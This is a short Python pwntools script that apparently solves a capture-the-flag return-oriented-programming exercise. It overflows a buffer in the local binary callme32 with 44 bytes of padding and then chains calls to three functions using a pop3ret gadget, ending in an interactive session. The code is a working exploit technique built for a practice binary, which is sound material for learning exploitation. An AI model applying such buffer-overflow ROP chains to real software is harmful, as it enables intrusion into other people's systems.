#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./callme32")
sh = process("./callme32")

callme_one = 0x080485C0
callme_two = 0x08048620
callme_three = 0x080485B0
pwnme = 0x080487B6
pop3ret = 0x080488a9

payload = ""
payload += "A"*44
payload += p32(callme_one)
payload += p32(pop3ret)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(callme_two)
payload += p32(pop3ret)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(callme_three)
payload += p32(pwnme)
payload += p32(1)
payload += p32(2)
payload += p32(3)

sh.sendline(payload)
sh.interactive()